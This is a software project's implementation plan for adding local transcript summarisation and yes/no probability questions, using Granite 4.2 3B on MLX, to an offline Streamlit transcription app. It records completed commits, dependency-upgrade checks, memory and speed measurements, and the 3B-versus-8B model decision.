# Plan: transcript analysis with Granite 4.2 3B

Status: **draft; Track B started** (A1–A3 committed on 2026-10-17 as 4001f01, 7ead012 and 7c93564, A4 and A5 on 2026-10-20 as 2d6ac40 and f890915, A6 the same day as 704d9d5, B1 the same day as 553d0f7, B2's measurements the same day, A7, which B2 added to Track A, on 2026-10-21 as 72e36d9, B3 the same day, its labels awaiting a person's review, and B4 the same day: the **3B** is the model; B5 and B6 (Phase 1 and 2 code) the same day, as 3d17bcf and 217d236; B7's code on 2026-10-21 on `feat/b7-analysis-ui`, its VoiceOver walk-through still to do. See Order of work). Written 2026-10-17 for a later implementation session. Delete this file (or move it under `docs/`) once the work lands; CLAUDE.md is where the lasting record goes.

## Order of work

Two tracks. **Track A** fixes the app as it ships today and doesn't depend on the LLM, so it goes first, one commit per item. **Track B** is the transcript analysis feature. Within a track, work top to bottom. Each item ends with a **done when** line; don't start the next item until it's met. Update the status line above as items land.

### Track A: fixes to the current app

| # | Commit | Done when |
|---|---|---|
| A1 | `fix(ui): serve on localhost only and disable usage stats` (`.streamlit/config.toml`, plus CLAUDE.md's Configuration note) | **Done (4001f01).** Verified: the server listens on `127.0.0.1:8599` only, and the LAN address refuses connections. Both keys are pinned by `test_config_serves_locally_without_usage_stats`, committed separately. |
| A2 | `chore: ignore model weights and local env files` (`.gitignore`) | **Done (7ead012).** `git check-ignore` confirms each pattern, and no tracked file is affected. |
| A3 | `docs: reword project description` (`pyproject.toml` + `README.md`) | **Done (7c93564).** Matches the GitHub description, which is already live; `uv lock --check` passes. |
| A4 | `fix(ui): keep the accepted formats readable at laptop widths` (Layout, change 5) | **Done (2d6ac40).** `ACCEPTED_FORMATS_CAPTION` is pinned by `test_accepted_formats_are_listed_under_the_dropzone`; rendered at 1470 and 1024 px (sidebar open) in both themes, every format shows; CLAUDE.md corrected. |
| A5 | `chore(deps): upgrade locked dependencies` (Step 0) | **Done (f890915).** av 19 forced the `av>=19.0.0` floor (`metadata_errors=` removed); silero-vad moved to 6.2.3 (its pin's condition met, `.jit` byte-identical); mlx 0.32.4 flipped the fixture's VAD-path `libvox` to `librivox`, matched by the reference. Originally: every new package is reviewed and noted in the commit body, all four checks pass, the real-weights tests ran rather than skipped, the app was checked by hand in both themes, and the CLAUDE.md version notes are updated. |
| A6 | `feat(ui): cap the layout width on large displays` (Layout, change 1) | **Done (704d9d5).** Measured before and after with Playwright: unchanged at 1024 and at 1470 with the sidebar open; 496 / 752 px columns everywhere above the cap (card 720). `test_layout_is_capped_and_centred` pins the wrapper; only the tree-shape check walked `at.main`, and it now goes through `_page`. Originally: must come after A4; the frame measurements are re-run before and after, the wrapper width is pinned by an AppTest, and the tests that walk `at.main` are updated. |
| A7 | `perf(pipeline): cap the mlx buffer cache` (found in B2; see CLAUDE.md, Performance) | **Done (72e36d9).** `limit_mlx_cache` sets 1 GiB once per process, after the decode and before the speech model load (pinned by an AppTest that fails if the call moves after it). Through the real app, 32 min with VAD on: 8.47 → 2.49 GB footprint after the run (lifetime peak 8.66 → 3.27 GB), transcript byte-identical, click-to-card 12.9 s both. Originally: MLX keeps freed GPU buffers in its own cache with no limit, so after a 30-minute VAD transcription the process footprint is 7.76 GB (0.88 GB active, 6.39 GB cached), and 8.15 GB after an hour. `mx.set_cache_limit(1 GiB)` measured 2.41 GB with transcription time unchanged (10.0 s vs 9.7 s). Set it **once per process** from a named constant (e.g. `MLX_CACHE_LIMIT_BYTES`, with the measurement beside it), not on every rerun's module execution; an `@st.cache_resource` helper called before the first model load is the natural place. **Done when:** the limit is set before any MLX allocation in a run; a unit test pins the constant and that the setter is called with it; the 30-minute footprint is re-measured through the real app (`phys_footprint`, as in B2) before and after, with transcription time unchanged and the transcript byte-identical; the four checks pass; CLAUDE.md's Performance bullet is updated from "does not set a limit yet" to the shipped value. Track B depends on it: the 8B's 10 GB budget is met only under the limit (8.53 GB vs 11.87 GB at 30 min), so it lands before B5. |

A4 and A6 can be one session; A5 should be its own, because a dependency break has to be attributable to the upgrade alone.

### Track B: transcript analysis

| # | Work | Done when |
|---|---|---|
| B1 | `chore(deps): add mlx-lm for transcript analysis` | **Done (553d0f7).** 0.32.2 landed, the release the API notes were written against, so they stand. The lock gained `mlx-lm` alone: its seven requirements were already there via `mlx-audio`, so there was nothing new to review. Originally: `mlx-lm` is in the lock, its new dependencies are reviewed (Security, rule 5), and the four checks pass. |
| B2 | Phase 0 spike, in the scratchpad (steps 2–10; step 1's `uv add` is B1, and step 4's evaluation run is B3) | **Done (2026-10-20, CLAUDE.md "Transcript analysis (planned): Phase 0 measurements").** Full analysis of 30 min is 41.5 s against the 30 s budget, and prefill alone is ~30 s at ~200 tok/s, compute-bound; memory meets the budget only under `mx.set_cache_limit(1 GiB)` (8.53 GB; 11.87 GB without); per question 0.34–0.39 s; per-segment 226 s; disk-full raises a bare `RuntimeError` from `hf_xet`, not `OSError`. Measured on battery; the prefill series re-run on AC agreed within ±3%. Originally: every other Phase 0 figure and every Performance budget has a measured value, written into CLAUDE.md. |
| B3 | `test(pipeline): add transcript analysis evaluation` (Evaluation; Phase 0 step 4's second half) | **Done (2026-10-21, CLAUDE.md "Transcript analysis (planned): evaluation"), labels pending review.** The 180 labels are drafted by Claude from the AMI annotations and await a person's review; `--rescore` re-scores a saved run after edits, without the model. The `anyone` prompt was chosen on the tuning half. Held-out pooled / within-excerpt ROC-AUC: **8B** 0.84 / 0.86 on human transcripts and 0.79 / 0.81 on ASR; **3B** 0.78 / 0.79 and 0.76 / 0.77. Decision ranks below chance for both, and P(yes) leans towards No. Full analysis of 30 minutes: 3B 22.6 s, inside the 30 s budget; 8B 44.8 s. The summary's action-item recall and rubric are still by hand. Originally: the labels and split are committed, and held-out scores exist on both human and ASR transcripts for the 8B, and for the 3B if the 8B missed a budget in B2. |
| B4 | **Decision point** (end of Phase 0) | **Done (2026-10-21; see "Decisions (B4)" after Phase 0).** 3B; `MAX_ANALYSIS_TOKENS = 24_576`; no Phase 3; no kept cache; the lock ships; no resample before Phase 1; the analysis download ships. The 8B's cache entry is deleted. Originally: 8B vs 3B, `MAX_ANALYSIS_TOKENS`, Phase 3 yes/no, the cache-keeping and lock decisions (Performance, items 3 and 6), and the PyAV resample question are each written into this file with the measured reason. The download decision (Phase 1) is made here too. |
| B5 | `feat(pipeline): summarise transcripts with granite 4.2 3b` (Phase 1 code and data) | **Done (2026-10-21).** `load_llm`, `check_analysis_length`, `prefill_transcript` (returns `TranscriptPrefill(cache, ids, messages)` rather than the planned `(cache, ids)` tuple, since every task needs the prefix turns to build its prompt), `summarize_transcript`, `parse_summary`, `Segment`/`Summary`, and `PipelineResult["segments"]`. The Phase 1 unit tests and the Phase 1 half of the contract tests pass, including the cache-after-summary equivalence on a tiny real Granite, plus a gated real-weights summary. The rest of the Unit list belongs to later rows. Two Unit items move to B7 because they're properties of the run order in `main()`: the length pre-check running before `load_llm` is called, and the blank-transcript skip. The pre-check function itself is tested here. Originally: the shared-prefix prefill, the summary and the `segments` key exist; the unit and contract tests listed for them pass. |
| B6 | `feat(pipeline): answer yes/no questions from cached transcript prefill` (Phase 2 code) | **Done (2026-10-21).** `DEFAULT_QUESTIONS`, `QUESTION_PROMPT` (the evaluation's `anyone` wording), `clean_questions`, `yes_probability`, `score_question` and `answer_questions`, with the low-mass warning at `MIN_YES_NO_MASS = 0.98`. Both cache-equivalence tests (after a question, after a summary) pass on a tiny real Granite. The evaluation now runs the shipped functions, and its held-out re-run reproduced B3's 3B scores bit for bit (pooled 0.78 human, 0.76 ASR; max |ΔP(yes)| 0.0). Originally: the cache-equivalence tests (after a question, and after a summary) pass, and the held-out evaluation scores are re-run against the shipped prompt. |
| B7 | `feat(ui): add transcript analysis card and questions` (Phase 1 and 2 UI) | **Code done (2026-10-21), VoiceOver walk-through pending.** The AppTests listed in Tests, Security and Performance pass, plus unit tests for `run_analysis` (one prefill), the inference lock, the Markdown export and the card. Rendered with the real models in both themes (a 2:17 meeting: transcript 1.3 s, analysis 8.7–10.9 s warm; a board-only re-run 1.8–1.9 s). Analysis card height with the 9 default questions: 1148 px at 1470 px (sidebar open), 1419 at 1024, 1248 at 760, 1072 from 1920 up. Layout change 3 was decided by the render: `st.dataframe` clipped the P(yes) column out of view in the 322 px and 421 px cards, so the board is one `st.progress` per row, number first, and the dataframe theme keys were not added. Skeleton sized from the measurements (`ANALYSIS_SUMMARY_HEIGHT_PX` plus 51 px per question): mid-run the transcript card moved 457 px when the card landed, now 45 px (the progress bar above it going away). The lock ships (B4) around `run_pipeline` and the analysis. Not done: the VoiceOver walk-through, Reduce Motion for `st.skeleton`, and the keyboard-order check (Accessibility, Verification), which need a person at the machine. Originally: all AppTests in Tests, Security, Performance and Accessibility pass; the frame measurements are re-run with analysis on; the VoiceOver walk-through (Accessibility) is done. |
| B8 | Phase 3, only if B4 said so | **Skipped: B4 said no** (1.66 s per segment, ~113 s for 32 minutes, and unmeasured). |
| B9 | `docs: document transcript analysis` | Everything under "Docs and housekeeping" is done, and this file is deleted or moved under `docs/`. |

The commit subjects here replace the ordering in "Docs and housekeeping"; that list stays as the full set of subjects.

## Goal

After transcription, optionally run one local LLM over the transcript and show:

1. **Summary card**: a short topic label, a summary, key topics and action items. This is generated text, parsed from JSON.
2. **Yes/no question board**: user-editable questions, each answered as **P(yes)** read from the model's next-token probabilities, not from generated text. Run over the whole transcript, and later optionally per VAD segment, so a yes can be located in time.

Everything runs on-device; nothing leaves the machine. The design borrows from two references:

- **Deepgram Text Intelligence** (`/v1/read`) has four features: summarize, sentiment, topics, intents. Deepgram itself is **rejected**: it needs an API key and sends users' content to an outside service, and this app is offline by design.
- **IBM's "Speech to Decisions" Space** (`ibm-granite/speech-to-decisions`) runs Granite Switch 4.1 8B. Its yes/no board, its normalisation P(yes) = P(Yes) / (P(Yes) + P(No)), and its trick of computing the transcript's attention state once and reusing it for every question are the ideas taken here. Its live mic streaming, the Guardian safety check and the Switch adapters are **not** taken (see Out of scope).

## Model

| | |
|---|---|
| Repo | `ibm-granite/granite-4.2-3b-q8-mlx`, IBM's own MLX conversion, Apache 2.0 (chosen at B4; see Decisions below) |
| Revision | `8e19ac6574124635eb8fbd06a15d05ebbfff82dd` (the only revision as of 2026-09-02; pin it, for the same reproducibility reason as `MODEL_REVISION`) |
| Weights | 3.89 GB, one `model.safetensors`, 8-bit affine, group size 64 |
| Architecture | `model_type: granite`, `GraniteForCausalLM`. Dense decoder: 40 layers, 40 attention heads, 8 KV heads (GQA), hidden 2560 (head dim 64), vocab 100,352, 131,072-token context. KV cache 80 KB per token. Same tokenizer and chat template as the 8B: Yes 9642, No 2822, EOS 100257. `mlx_lm.models.granite` exists in mlx-lm 0.32.2 |
| Evaluated and rejected | `ibm-granite/granite-4.2-8b-q4-mlx` at `9047f073e46c527f70dade07bb55b1700d728e36`: 4.95 GB, 4-bit, hidden 4096, 32 heads, KV 160 KB per token. The planning session's first choice, and the model Phase 0 measured |
| Chat format | ChatML (`<\|im_start\|>role\n...<\|im_end\|>`). This is **not** Granite Switch's `<\|start_of_role\|>` format, so don't copy the Space's string markers |

Why these candidates, for a 16 GB M2 Pro (decided in the planning session; B4 then chose the 3B on measurement):

- `8b-q8` (9.34 GB) and `30b-q4` (16.47 GB) don't fit next to the app. The app's existing load is about 3–4 GB of OS, browser and Streamlit, about 1.5 GB of TurboCTC at a 30 s segment's peak, and decoded audio. Also, macOS lets the GPU use well under all 16 GB.
- `3b-q8` (3.89 GB) is the **fallback** if Phase 0 shows 8B is too slow or too tight. The constant makes it a one-line swap.
- Prefer it over the `lmstudio-community/granite-4.2-8b-MLX-4bit` build of the same model because it's org-maintained and has a single revision to pin.

### Facts verified in the planning session (re-check in Phase 0)

- **Thinking mode is on by default.** The template sets `enable_thinking` to True unless passed, and the generation prompt then ends `<|im_start|>assistant\n<think>\n`. With `enable_thinking=False` it ends `<|im_start|>assistant\n<think></think>`, so the answer's first token comes right after `</think>`. A `reasoning_effort` kwarg also exists (`"low"`/`"high"`); it's unused here.
- **Model card warning:** passing a plain string prompt to mlx-lm adds a spurious BOS token. Apply the chat template to get token ids and pass the **ids**, with no `add_special_tokens`.
- **Sampling:** `generation_config.json` says temperature 1.0 and top-p 0.95, but mlx-lm doesn't read it and defaults to greedy decoding. **Use greedy on purpose** (`make_sampler(temp=0.0)`), because a summary that changes between identical runs isn't useful.
- **Token ids** (from `tokenizer.json` at the pinned revision; each is a single token): `"Yes"` 9642, `"No"` 2822, `" Yes"` 7566, `" No"` 2360. After `<think></think>` there's no space, so the candidates are most likely `Yes`/`No`. **Phase 0 must confirm this from the model's real top-k next tokens, not assume it.**
- **mlx-lm 0.32.2 API:**
  - `mlx_lm.load(path_or_hf_repo, tokenizer_config=None, model_config=None, adapter_path=None, lazy=False, return_config=False, revision=None, trust_remote_code=False)`. It has `revision=` but **no `strict=`**; the underlying `mlx_lm.utils.load_model(..., strict: bool = True, ...)` defaults to strict.
  - `generate_step(prompt, model, *, max_tokens, sampler, logits_processors, max_kv_size, prompt_cache, prefill_step_size=2048, kv_bits, prompt_progress_callback, ...)`, plus `stream_generate`.
    - **`generate_step` has no end-of-sequence check.** Only `stream_generate` stops at `tokenizer.eos_token_ids` (`generate.py:739` in the cached 0.32.2 source). Driving `generate_step` directly means stopping on EOS yourself (Phase 1, `summarize_transcript`).
    - Its `prompt` is typed `mx.array`, not `list[int]`, and the package ships `py.typed`, so `ty` checks calls to it: wrap ids with `mx.array(ids)`.
    - `prompt_progress_callback` reports prefill progress and could replace the hand-written chunk loop in `prefill_transcript`. Phase 0 checks whether it gives an `st.*` call per chunk, which is what lets a rerun stop the run.
  - `mlx_lm.models.cache.make_prompt_cache(model, max_kv_size=None)` returns one cache per layer, `trim_prompt_cache(cache, num_tokens)`, `can_trim_prompt_cache(cache)`. `KVCache` is trimmable; its current length is **`offset`** (`models/cache.py`), and `trim(n)` clamps to it.
  - **Tokenizer:** call `apply_chat_template` through the `TokenizerWrapper` that `mlx_lm.load` returns. It forces `return_dict=False` (`tokenizer_utils.py:403`), so it returns token ids. Plain `transformers` 5.17 defaults to `return_dict=True` and would return a dict instead.
  - These were read from a cached copy of the 0.32.2 source (`~/.cache/uv/archive-v0/…/mlx_lm`) before it was installed; re-check them at B1.
- **Dependencies:** mlx-lm 0.32.2 requires `mlx>=0.32.2` and `transformers>=5.7.0`, and the lock already has mlx 0.32.2 and transformers 5.17.0 (0.32.4 and 5.20.1 after Step 0), so no resolution conflict is expected. It also brings back `sentencepiece`, `protobuf`, `pyyaml` and `jinja2`; CLAUDE.md records `mlx-lm` and `sentencepiece` leaving the lock, and that note needs revising.

## Step 0: upgrade dependencies (before Phase 0)

Upgrade the lock first, in its own commit. Phase 0 then measures the versions the feature will ship on, and a break caused by the upgrade can't be mistaken for one caused by the feature.

1. `uv lock --upgrade`, then `uv sync`. Never hand-edit `uv.lock` (`.claude/settings.json` denies it). This moves every package to the newest version the `pyproject.toml` constraints allow. It doesn't change the constraints themselves.
2. Leave the floors and pins alone unless something forces a change:
   - **`silero-vad==6.2.1` stays.** Check whether a release after 6.2.2 drops the `torchaudio<2.10` bound *and* makes the `onnxruntime` import lazy. Only then move the pin, following its comment in `pyproject.toml`.
   - Raise a floor only with the reason written beside it, as every existing floor has.
3. Run the full check: `uv run ruff check .`, `uv run ruff format --check .`, `uv run ty check`, `uv run pytest`. CI skips the real-weights tests, so make sure they actually run locally, not skip. Then do one transcription in the app by hand, in both light and dark mode.
4. **Review every package the upgrade adds** before committing (see Security). The 2026-10-17 preview adds `httpx2`, `httpcore2`, `httpx2-jsfetch` and `truststore`, none of which the project has used before. For each one:
   - run `uv tree --invert --package <name>` to see what pulls it in;
   - check it on PyPI: the maintainer, the linked source repository, and its release history.

   A renamed fork of a popular library is a known way to slip malicious code into a dependency tree. Write down in the commit body what pulls each new package in.
5. Commit as `chore(deps): upgrade locked dependencies`. Include any reformatting from a new `ruff` in that commit, so none of it lands in a feature commit.

**Preview** from `uv lock --upgrade --dry-run` on 2026-10-17. Re-run it at the start, because it will have moved. These are the upgrades to watch:

- **`huggingface-hub` 1.32.0 → 2.2.0 (major).** `tests/test_streamlit_app.py` uses `try_to_load_from_cache` to decide whether the real-weights test runs. Check that it still exists, still returns a path for a cached file and still makes no network call. This plan's Phase 0 and real-weights test rely on it too.
- **`av` 18.1.0 → 19.0.1 (major).** This is the whole decode path. The guards are `test_wav_decodes_bit_exactly` and the three test files built inside the tests (`latin1_tagged_wav`, `two_track_mkv`, `undecodable_mkv`). Check that `metadata_errors=`, `streams.best` and `AudioResampler` still behave as `_open_container`/`_decode_audio` expect. If the floor needs to move, write down why.
- **`ruff` 0.16.8 → 0.17.1.** The formatting style may change. Run `ruff format .`, including over the Markdown code samples.
- **`ty` 0.0.82 → 0.0.89.** New warnings are likely. Fix them rather than adding `# ty: ignore`.
- **`mlx` 0.32.2 → 0.32.4.** Check that it still ships the `mlx/core/*.pyi` type stubs. Without them, `import mlx.core` needs a `# ty: ignore` again (CLAUDE.md, Dependencies).
- **`mlx-audio` 0.5.5 → 0.5.9.** `TestGraniteSpeech5Contract` and `TestMlxVadInternals` guard the parts of it the app uses, and `_supports_mlx_vad` checks the VAD internals at load. A VAD fallback warning at load would show drift.
- **`streamlit` 1.64.0 → 1.66.0.** CLAUDE.md's theme notes were checked on 1.64.0 (the appearance menu, the `:small[]` contrast). Look at the app once in each mode.
- Packages the app doesn't import directly: `transformers` 5.17.0 → 5.20.1, `torch` 2.14.0 → 2.14.1, `pyarrow` 25 → 26, `websockets` 16 → 17. `httpx`/`httpcore` are replaced by `httpx2`/`httpcore2`. Nothing in the repo imports these directly; confirm with a grep.
- `silero-vad` doesn't move: the exact pin holds it.

Then update CLAUDE.md wherever it gives a locked version: `mlx-audio` "locked at 0.5.5", `streamlit` "locked at 1.64.0", the `transformers` 5.17.0 notes and the mlx 0.32.x stubs note. Grep for `locked at` and for each old version number. Also note that the `transformers` reference comparison in Languages was run on 5.17.0. That doesn't need re-running unless the TurboCTC output changes.

## Phase 0: spike and measure (before writing app code)

Do this in a scratch script under the session scratchpad, not in the repo. Weights stay in the HF cache too: `.gitignore` ignores `*.safetensors`, `*.gguf`, `*.npz` and `mlx_model/` (the default output folder of `mlx_lm.convert`) in case a conversion or a `--local-dir` download lands in the working tree. The project's habit is measured figures, and several constants below depend on them.

1. `uv add mlx-lm`, after Step 0, and record which version lands. The API notes above are from 0.32.2, so re-check them if it's newer. Then load `LLM_ID` at `LLM_REVISION` via `mlx_lm.load`. Record: cold download time, load time, resident memory (`mx.get_active_memory()`, `mx.get_peak_memory()`), and that loading is strict (a key-mismatch should raise). 0.32.2 landed in B1. Read in its source there: `load` has no `strict` parameter, but it calls `mlx_lm.utils.load_model` with that function's default `strict=True`, which reaches `model.load_weights(..., strict=strict)`. Only `sharded_load` passes `strict=False`, and it is never used here. So `load` is strict by default; confirm it by a mismatch (e.g. drop one key from a copy of the weights) rather than by reading, and add a contract test asserting `load_model`'s `strict` default stays `True`, since `load` gives no way to pass it.
2. Build a long transcript: tile real app output to about 30 minutes, roughly 5–6K words of lowercase unpunctuated text. Measure **prefill speed** (tokens/s) at 1K, 4K, 8K and 16K tokens, **generation speed** (tokens/s), and **peak memory** at each. Estimated KV cache is 40 layers × 2 (keys and values) × 8 heads × 128 dims × 2 bytes ≈ **160 KB per token**: about 1.3 GB at 8K tokens and about 2.6 GB at 16K. Confirm by measurement.
3. Measure the **whole process at its peak** with the speech model also resident, as the real app has it: TurboCTC transcription, then the LLM. Decide `MAX_ANALYSIS_TOKENS` from this. With VAD on, the app accepts any length of audio, and at the ~8K tokens per 30 minutes assumed throughout this plan a 3-hour clip is about 48K tokens (about 7.7 GB of KV at 160 KB per token), so analysis needs its own limit. If it's too tight, try `kv_bits=8` in `generate_step` and measure the quality and memory difference before taking it.
4. **Token check, then the evaluation.**
   - First, on 3–4 transcripts: confirm that `Yes`/`No` (or the spaced forms) are the top next tokens after `<think></think>`, and sum their probability mass. If the mass is low, the model is trying to say something else, and the prompt needs changing before the number means anything. This is a sanity check on the readout, **not** a measure of quality.
   - Then build and run the evaluation set (see Evaluation; this is B3 in Order of work) on the 8B, and on the 3B only if the 8B misses a budget (step 8 explains why the 3B isn't fetched otherwise). Tune the prompt on the tuning half only, and report scores on the held-out half.
5. Check the **cache equivalence**: logits from reusing the cached transcript plus a question suffix must match logits from the full prompt run from scratch, within bf16 tolerance. Also check that `trim_prompt_cache` restores the cache exactly between questions: question B's logits after question A then a trim must equal B's logits on a fresh copy of the cache.
6. Time 10 questions on a 30-minute transcript. Time the per-segment variant too: about 60 segments × 10 questions. This decides whether Phase 3 is worth doing.
7. Measure **torch's share of resident memory**, which has never been measured. In a fresh process, record resident memory (RSS) before and after `import torch, torchaudio`, and again after `load_silero_vad()`. Compare that with the step 3 peak. Torch stays loaded even when the MLX VAD is in use, because the waveform is a `torch.Tensor` and the fallback is imported at module scope. So whatever it costs comes out of the 16 GB budget the LLM needs. A large share is the argument for the "MLX-only stack" follow-up (see Out of scope).
8. **Disk budget** (see Storage).
   - Before any download, record free space (`df -h ~`) and the cache size (`du -sh ~/.cache/huggingface/hub`). On 2026-10-17 that was 37 GiB free (the disk was 92% full) and a 70 GB cache.
   - Downloading both candidates costs about 9 GB (4.95 + 3.89), so fetch the 3B only if the 8B fails.
   - Once 8B vs 3B is decided, delete the rejected model's cache entry, and record what the chosen one actually occupies on disk.
   - Find out what a download that runs out of disk raises from `mlx_lm.load`. Is it an `OSError` with `errno.ENOSPC`, does `huggingface_hub` warn first, and does a partial file stay behind? Phase 1's error handling depends on the answer.
   - Likewise, record what `mlx_lm.load` raises on first use with the network off (model not cached), so Phase 1 can map it to the one-line "isn't downloaded yet" error.
9. **Memory handover, sharing and concurrency** (see Performance).
   - **MLX's buffer cache:** after a TurboCTC transcription, record `mx.get_active_memory()`, `mx.get_cache_memory()` and `mx.get_peak_memory()`. Then try `mx.clear_cache()` (or `mx.set_cache_limit(...)`) before the LLM loads and record the difference. If clearing it brings the step 3 peak under budget, that's cheaper than evicting the speech model.
   - **Shared prefix:** time a full analysis (summary + 10 questions) on a 30-minute transcript with one shared prefill, against separate prefills for the summary and the board. Confirm, as in step 5, that the questions' logits after a summary and its trim match those from a fresh prefill.
   - **Keeping the cache between reruns:** record the size of the transcript's cache at 8K and 16K tokens. This decides whether item 3 in Performance is worth its memory.
   - **Two tabs at once:** start an analysis in two browser tabs together. Record whether it errors, the peak memory and the timing. This decides whether the inference lock is needed (Performance, item 6).
   - **Cold vs warm:** time the first analysis after the model loads against the second. Report the budgets as warm figures, and give the cold cost alongside.
10. **Generation details** Phase 1 depends on:
    - Confirm that `<|im_end|>` is in `tokenizer.eos_token_ids`, and that a summary run with the EOS stop ends there with nothing trailing.
    - Measure tokens per word on the tiled transcript from step 2, which sets the length pre-check's estimate.
    - Check whether `generate_step`'s `prompt_progress_callback` can drive the prefill progress bar, i.e. whether calling `st.*` from it works and lets a rerun stop the prefill. If so, it replaces the hand-written chunk loop in `prefill_transcript`.
    - Confirm `cache[0].offset` after a summary is one token past what the loop consumed, or not, and that the trim leaves it at exactly `len(prefix_ids)`.

**Decision point after Phase 0:**
- Whether each performance budget is met (see Performance). A missed budget is evidence for 3B, `kv_bits=8` or a lower `MAX_ANALYSIS_TOKENS`, in that order of preference. Write down which one is used and why.
- 8B vs 3B. The 8B is kept if it meets every budget and its held-out scores are acceptable. The 3B is fetched and evaluated only if the 8B misses a budget, and is then decided on the held-out evaluation scores (step 4) **together with** speed and memory. A faster model that ranks answers worse is not automatically the better choice. Write the trade-off down either way.
- `MAX_ANALYSIS_TOKENS`.
- Whether Phase 3 ships.
- Whether step 7's figure is large enough to do the PyAV resample (see Out of scope) before Phase 1. That change cuts peak memory regardless of torch's share.

Write the measured numbers into CLAUDE.md in the same style as the TurboCTC memory series.

### Decisions (B4, 2026-10-21)

Measured on the M2 Pro, 16 GB, with the speech model resident and the 1 GiB MLX cache limit, warm. The source is the real 32-minute app transcript from the A7 run (6,591 prefix tokens), tiled for longer lengths. Full figures are in CLAUDE.md, "Transcript analysis (planned): evaluation" and "Phase 0 measurements".

- **The 3B, not the 8B** (user's call, on the B3 numbers). Held-out pooled / within-excerpt ROC-AUC on ASR transcripts, which is what the app feeds the model: 3B 0.76 / 0.77 against the 8B's 0.79 / 0.81. On human transcripts: 0.78 / 0.79 against 0.84 / 0.86. Full analysis of 30 minutes: 3B 22.6 s, inside the 30 s budget, against the 8B's 44.8 s; MLX peak 5.13 against 6.65 GB. The trade-off, written down as the plan asks: the 3B ranks answers worse, by 3–4 points on ASR input (about one excerpt's worth of swing at 90 labels, so within noise) and 6–7 on human transcripts (closer to a real gap). It is twice as fast and the only candidate inside every budget. `kv_bits=8` and a lower `MAX_ANALYSIS_TOKENS` could not rescue the 8B, because its miss is prefill compute (~205 tok/s), not memory. The 8B's cache entry has been deleted (`du` on the hub: 9.1 → 4.5 GB). `uv run python -m evals.run_analysis_eval --model 8b` re-fetches it if a comparison is ever wanted.
- **`MAX_ANALYSIS_TOKENS = 24_576`, about two hours of meeting speech** (206 prefix tokens per minute on the A7 transcript). Whole-process lifetime peak footprint is 7.71 GB at 6.6K tokens (32 min), 8.13 GB at 13.1K, 9.31 GB at 26.2K and 10.18 GB at 39.2K. The cap is set by memory, the hard constraint (past ~10 GB a 16 GB Mac swaps), with ~0.8 GB to spare: interpolated, ≈ 9.2 GB at 24.6K. Time is the soft constraint, since the bar moves and a rerun can stop it: prefill slows with context (500 → 433 → 338 → 275 tok/s), and the full analysis takes 22.5 s at 32 min, 42.0 s at 64 min and 91.6 s at 128 min. At the cap that is about 85 s. 32,768 would have fit the 10 GB budget too, by ~0.2 GB, which is too thin. The length pre-check's estimate uses 1.072 tokens per word.
- **Phase 3 does not ship in v1; B8 is skipped.** Per segment (a fresh cache, then 9 questions) costs 1.66 s, so a 32-minute meeting's 68 segments take ~113 s, five times the whole-transcript analysis, on top of it. Nothing in the evaluation measures per-segment answers, so that cost would buy an unmeasured feature. Revisit only with per-segment labels.
- **Don't keep the KV cache between reruns** (Performance, item 3). A board-only re-run then costs one prefill, 13.2 s at 30 minutes, which meets that budget by definition. Keeping the cache would hold 0.5 GB per session at 30 minutes and 2 GB at the cap, per tab, and 2 GB on top of the cap's ~9.2 GB peak breaks the budget.
- **Ship the inference lock** (Performance, item 6). B2's two-thread run raised no error and gave bit-identical results, but each analysis took twice as long and held its own KV cache. Two concurrent analyses at the cap would add ~2 GB past ~9.2 GB. A lock costs nothing measurable for one user and removes both the memory risk and the untested concurrent-MLX path.
- **No PyAV resample before Phase 1.** Torch's share (step 7) is 140 MB, under 2% of the analysis peak, and the source-rate decode it would avoid is local to `load_and_preprocess_audio`, freed before the LLM loads, so it never adds to the analysis peak. It stays an Out-of-scope follow-up, worth doing on its own merits.
- **Ship the `<stem>_analysis.md` download in v1** (Phase 1, Download). Analysis results live only in session state, so without it a summary leaves the app only by copy and paste. Its cost is one `download_button` (`key="dl_md"`, `on_click="ignore"`) in the Analysis card's header and a formatter with a unit test. That is a product call, made here on cost alone. Dropping it touches nothing else.

## Phase 1: summary card

### Code (`streamlit_app.py`)

- **Constants:** `LLM_ID`, `LLM_REVISION` (full 40-hex hash), `MAX_ANALYSIS_TOKENS` (from Phase 0), `ANALYSIS_MAX_NEW_TOKENS` (e.g. 512).
- **`load_llm(model_id, revision)`:** `@st.cache_resource`, wrapping `mlx_lm.load(model_id, revision=revision)`, loaded lazily like the other models. Its docstring should say why there's no `strict=` (the default is strict, and a contract test pins that). Return `(model, tokenizer)`.
- **`Summary(TypedDict)`:** `topic: str`, `summary: str`, `topics: list[str]`, `action_items: list[str]`. It's held in session state under `summary`. Phase 2's board is a separate `list[tuple[str, float]]` under `board`, and the two are cached under different keys (Invalidation).
  - Deepgram's separate "intents" are dropped: for this app's audio (meetings, calls, memos), action items are the useful form, and the yes/no board covers the rest.
  - **No confidence numbers on generated fields.** A number the LLM writes is made up, not measured. Only Phase 2's probabilities are real.
- **Prompt layout: one shared prefix for every task** (see Performance). The transcript is the long, expensive part, so it's processed (prefilled) **once** per analysis, and the summary and every question continue from that cache.
  - **`_transcript_prefix_ids(tokenizer, transcript) -> list[int]`**, the shared prefix:
    - A system turn with the general role. It is the same for every task, so it holds nothing task-specific.
    - A user turn holding the transcript, delimited, and stating that it is **lowercase, unpunctuated ASR output that may contain misheard words** (the same caveat IBM's Space gives).
  - **Task suffixes** come after the prefix:
    - For the summary: a user turn with the JSON instructions, then the generation prompt.
    - For each question: the question turn, then the generation prompt (Phase 2).
    - Build the full prompt with `tokenizer.apply_chat_template(..., add_generation_prompt=True, enable_thinking=False)` and take the suffix as the ids after the prefix. **Assert that the full prompt starts with exactly the prefix ids.** Chat templates can rewrite earlier turns (e.g. the `<think></think>` handling of assistant turns), and then a cached prefix no longer matches. On a mismatch, run that task from a full prompt on a fresh cache and warn (`RuntimeWarning`, matching the VAD fallbacks' habit of never downgrading silently). This check is the canonical one for both the summary and the questions.
  - **`prefill_transcript(model, tokenizer, transcript, on_progress) -> tuple[list[KVCache], list[int]]`:** builds `prefix_ids = _transcript_prefix_ids(...)`, then `cache = make_prompt_cache(model)` (one cache per layer, hence the list), then prefills the prefix in `prefill_step_size` chunks (`model(chunk[None], cache=cache)` and `mx.eval` over the cache state), calling `on_progress` **before each chunk**. Returns the cache and `prefix_ids`; the task functions need the ids to build and check their suffixes. Each progress update is also a point where a Streamlit rerun can stop the run (see Performance). Every analysis, including a board-only re-run, gets its cache from here.
  - Feed the transcript **without** the `[M:SS - M:SS]` prefixes: they cost tokens and invite made-up timestamps. Strip them from `PipelineResult["transcript"]`, or better, have `run_pipeline` also return the plain segment texts (see Data below).
